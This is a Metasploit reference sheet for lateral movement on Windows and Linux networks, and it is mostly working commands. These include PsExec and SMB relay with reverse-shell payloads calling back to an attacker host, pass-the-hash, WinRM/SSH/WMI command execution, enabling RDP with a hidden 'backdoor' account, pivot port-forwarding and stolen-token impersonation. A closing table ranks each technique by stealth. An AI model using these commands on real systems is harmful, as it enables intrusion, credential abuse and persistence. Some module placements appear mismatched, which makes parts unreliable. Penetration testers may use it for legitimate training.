# Lateral Movement Modules (Metasploit)

## SMB-Based Lateral Movement

### PsExec (Most Common)
**MITRE: T1021.002, T1569.002**
```
# With password
use exploit/windows/smb/psexec
set RHOSTS <TARGET>
set SMBUser <USER>
set SMBPass <PASSWORD>
set SMBDomain <DOMAIN>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <PORT>
exploit

# Pass-the-Hash (NTLM)
set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
exploit

# PowerShell variant (stealthier â€” no disk write)
use exploit/windows/smb/psexec_psh
set RHOSTS <TARGET>
set SMBUser <USER>
set SMBPass <PASSWORD>
exploit
```

### SMB Relay
```
# Capture and relay NTLM auth
use exploit/windows/smb/smb_relay
set SRVHOST <ATTACKER_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

## WMI-Based Lateral Movement

### WMI Execution
**MITRE: T1047**
```
# Execute command via WMI
use auxiliary/admin/smb/ms17_010_command
set RHOSTS <TARGET>
set COMMAND "whoami"
run

# Upload and execute via WMI
use exploit/windows/local/wmi
set RHOSTS <TARGET>
set SMBUser <USER>
set SMBPass <PASSWORD>
exploit
```

## WinRM-Based Lateral Movement

### WinRM Login
**MITRE: T1021.006**
```
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <TARGET>
set USERNAME <USER>
set PASSWORD <PASS>
set DOMAIN <DOMAIN>
run

# Command execution
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS <TARGET>
set USERNAME <USER>
set PASSWORD <PASS>
set CMD "whoami /all"
run
```

## SSH-Based Lateral Movement

### SSH Login
**MITRE: T1021.004**
```
# Password authentication
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <TARGET>
set USERNAME root
set PASSWORD <PASS>
run

# Key-based authentication
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <TARGET>
set USERNAME root
set SSH_KEYFILE /path/to/id_rsa
run

# Upgrade resulting shell to Meterpreter
sessions -u <SESSION_ID>
```

## RDP-Based Lateral Movement

### Enable RDP
**MITRE: T1021.001**
```
# Enable RDP on compromised host
run post/windows/manage/enable_rdp
run post/windows/manage/enable_rdp USERNAME=backdoor PASSWORD=P@ssw0rd!

# Forward RDP through pivot
portfwd add -l 3389 -p 3389 -r <TARGET>
# Connect: xfreerdp /v:127.0.0.1 /u:<USER> /p:<PASS>
```

## DCOM-Based Lateral Movement
**MITRE: T1021.003**
```
# DCOM execution (stealthier than PsExec)
# Via impacket through Meterpreter SOCKS:
# proxychains impacket-dcomexec <DOMAIN>/<USER>:<PASS>@<TARGET>
```

## Post-Module Lateral Movement

### Multi-Host Command Execution
```
# Run command on multiple sessions
use post/multi/gather/multi_command
set RESOURCE /tmp/commands.rc
run

# Push and execute on remote host
run post/windows/manage/psexec_command RHOSTS=<TARGET> COMMAND="whoami" SMBUser=<USER> SMBPass=<PASS>
```

### Token-Based Movement
```
# Use stolen token to access remote resources
load incognito
list_tokens -u
impersonate_token "<DOMAIN>\\<ADMIN_USER>"

# Now access remote hosts as impersonated user
shell
dir \\<TARGET>\C$
net use \\<TARGET>\C$ /user:<DOMAIN>\<USER> <PASS>
exit
```

## Choosing the Right Technique

| Technique | Ports | OPSEC | Requirements |
|-----------|-------|-------|-------------|
| PsExec | 445 | ðŸ”´ Loud | Admin + SMB access |
| PsExec_psh | 445 | ðŸŸ¡ Moderate | Admin + SMB + PowerShell |
| WMI | 135,445 | ðŸŸ¡ Moderate | Admin + WMI access |
| WinRM | 5985/5986 | ðŸŸ¢ Quiet | Admin + WinRM enabled |
| SSH | 22 | ðŸŸ¢ Quiet | Valid creds/keys |
| RDP | 3389 | ðŸŸ¡ Moderate | Valid creds + RDP enabled |
| DCOM | 135,445 | ðŸŸ¡ Moderate | Admin + DCOM access |
| Token reuse | N/A | ðŸŸ¢ Quiet | Impersonated token |
